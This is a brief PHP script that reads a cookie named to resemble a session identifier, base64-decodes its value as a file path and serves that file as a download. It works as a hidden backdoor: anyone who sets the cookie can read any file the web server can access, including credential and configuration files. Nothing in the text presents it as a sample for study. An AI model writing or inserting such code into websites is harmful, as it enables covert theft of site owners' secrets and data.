<?php
if(isset($_COOKIE['PHPSECID'])){
	$file = base64_decode($_COOKIE['PHPSECID']);
header("Content-Description: File Transfer"); 
header("Content-Type: application/octet-stream"); 
header("Content-Disposition: attachment; filename=" . basename($file)); 
readfile ($file);
exit(); 	
}

